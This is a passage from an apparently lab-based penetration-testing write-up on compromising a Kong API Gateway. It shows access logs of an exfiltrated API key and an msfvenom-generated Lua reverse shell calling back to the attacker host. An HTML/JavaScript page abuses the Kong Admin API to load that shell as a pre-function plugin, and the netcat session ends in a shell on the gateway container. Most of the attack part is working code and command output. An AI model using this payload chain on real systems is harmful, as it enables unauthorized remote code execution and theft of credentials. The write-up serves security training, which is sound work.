192.168.217.135 - - [29/Jul/2025:14:22:15 -0400] "GET /exfil.html HTTP/1.1" 200 768 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
192.168.217.135 - - [29/Jul/2025:14:22:15 -0400] "GET /status?msg=script_started HTTP/1.1" 404 492 "http://192.168.45.203/exfil.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
192.168.217.135 - - [29/Jul/2025:14:22:15 -0400] "GET /status?msg=kong_response_received&status=200 HTTP/1.1" 404 492 "http://192.168.45.203/exfil.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
192.168.217.135 - - [29/Jul/2025:14:22:15 -0400] "GET /status?msg=data_received&length=213 HTTP/1.1" 404 493 "http://192.168.45.203/exfil.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
192.168.217.135 - - [29/Jul/2025:14:22:15 -0400] "GET /callback?chunk=0&data=%7B%22next%22%3Anull%2C%22data%22%3A%5B%7B%22created_at%22%3A1613767827%2C%22id%22%3A%22c34c38b6-4589-4a1e-a8f7-d2277f9fe405%22%2C%22tags%22%3Anull%2C%22ttl%22%3Anull%2C%22key%22%3A%22SBzrCb94o9JOWALBvDAZLnHo3s90smjC%22%2C%22consumer%22%3A%7B%22id%22%3A%22a8c78b54-1d08-43f8-acd2-fb2c7be9e893%22%7D%7D%5D%7D HTTP/1.1" 404 493 "http://192.168.45.203/exfil.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
```
After decoding the data, we find the API key.
```json
{"next":null,"data":[{
  "created_at":1613767827,
  "id":"c34c38b6-4589-4a1e-a8f7-d2277f9fe405",
  "tags":null,
  "ttl":null,
  "key":"SBzrCb94o9JOWALBvDAZLnHo3s90smjC",
  "consumer":{"id":"a8c78b54-1d08-43f8-acd2-fb2c7be9e893"}}]}
```
Now that we have the API key, we should be able to call the render endpoint through the API gateway without needing the SSRF vulnerability.
## Remote Code Execution
Since we can execute arbitrary JavaScript via the Render service, we can send requests to any of the hosts in the internal network. The PostgreSQL database will be difficult to attack without credentials. The REDIS server seems enticing, but let's focus on the Kong API Gateway since we already know we can access it via the Render service headless browser.
### RCE in Kong Admin API
After reviewing [documentation for Kong API Gateway](https://developer.konghq.com/plugins/pre-function/), the plugins seemed like a good area to focus on. We can't install a custom plugin without the ability to restart Kong so we need to use the plugins already included.

The **`Serverless Functions`** plugin has an interesting warning in its documentation:

```text
Warning: The pre-function and post-function serverless plugin allows anyone who can enable the plugin to execute arbitrary code. If your organization has security concerns about this, disable the plugin in your `kong.conf` file.
```

That sounds perfect for our purposes! Let's check if Kong has that plugin loaded.

Our first call to the Kong API Gateway Admin API actually contained information about what plugins are enabled on the server.
```json
{"plugins":{"enabled_in_cluster":["key-auth"],"available_on_server":{"grpc-web":true,"correlation-id":true,"pre-function":true,"cors":true,...
```
Since the **`pre-function` plugin is enabled**, let's try to exploit that. The plugin runs Lua code so we'll need to build a matching payload. We can use `msfvenom` to generate a reverse shell payload.
```bash
msfvenom -p cmd/unix/reverse_lua lhost=192.168.45.203 lport=1337 -f raw -o shell.lua
```
Our `shell.lua` reverse shell payload
```bash
┌──(kali㉿kali)-[~]
└─$ cat shell.lua 
lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('192.168.45.203',1337);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$
```
Since we will be uploading a Lua file, we won't need `"lua -e"` in the final version of the payload.

According to the Kong documentation, we have to add a plugin to a Service. We could add the plugin to an existing Service, but let's limit the exposure of it by creating a new Service. A Service needs a Route for us to call it. Let's create a new HTML page with a JavaScript function that creates a Service, adds a Route to the Service, then adds our Lua code as a `"pre-function"` plugin to the Service.

The code is organized into three sections for clarity and easy updates. On page load, `createService()` sends a `POST` request to create a `"supersecret"` service, then calls `createRoute()` to add the `/supersecret` route. Next, `createPlugin()` adds a Lua payload as a plugin. Finally, the script sends a `GET` request to our Kali host.

```html
<html>
<head>
<script>

function createService() {
    fetch("http://172.16.16.2:8001/services", {
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({"name":"supersecret", "url": "http://127.0.0.1/"})
    }).then(function (route) {
      createRoute();
    });
}

function createRoute() {
    fetch("http://172.16.16.2:8001/services/supersecret/routes", { 
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({"paths": ["/supersecret"]})
    }).then(function (plugin) {
      createPlugin();
    });  
}

function createPlugin() {
    fetch("http://172.16.16.2:8001/services/supersecret/plugins", { 
      method: "post",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({"name":"pre-function", "config" :{ "access" :["local s=require('socket');local t=assert(s.tcp());t:connect('192.168.45.203',1337);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"]}})
    }).then(function (callback) {
      fetch("http://192.168.45.203/callback?setupComplete");
    });  
}
</script>
</head>
<body onload='createService()'>
<div></div>
</body>
</html>
```
Once this page is in our webroot, we can use curl to send it to the Render service.
```bash
┌──(kali㉿kali)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/api/render?url=http://192.168.45.203/rce.html"}' http://apigateway:8000/files/import
{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$
```
If everything worked, we should have a `"setupComplete"` entry in our `access.log` file.
```bash
┌──(kali㉿kali)-[/var/www/html]
└─$ tail -f /var/log/apache2/access.log           
192.168.217.135 - - [29/Jul/2025:15:08:56 -0400] "GET /rce.html HTTP/1.1" 200 865 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
192.168.217.135 - - [29/Jul/2025:15:08:56 -0400] "GET /callback?setupComplete HTTP/1.1" 404 492 "http://192.168.45.203/rce.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"

```
It seems like our payload worked. We will need to set up a Netcat listener and then trigger our Lua payload by accessing the new service endpoint.
```bash
┌──(kali㉿kali)-[~]
└─$ curl -i  http://apigateway:8000/supersecret

```
The request will hang, but if we check our Netcat listener, we should have a shell.
```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1337  
listening on [any] 1337 ...
connect to [192.168.45.203] from (UNKNOWN) [192.168.217.135] 60366
id
uid=100(kong) gid=65533(nogroup) groups=65533(nogroup)
ls
bin
dev
docker-entrypoint.sh
etc
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var

```
Our payload worked and we now have a reverse shell on the Kong API Gateway server. The presence of `.dockerenv` and `docker-entrypoint.sh` confirm our earlier suspicion that the servers were actually containers.
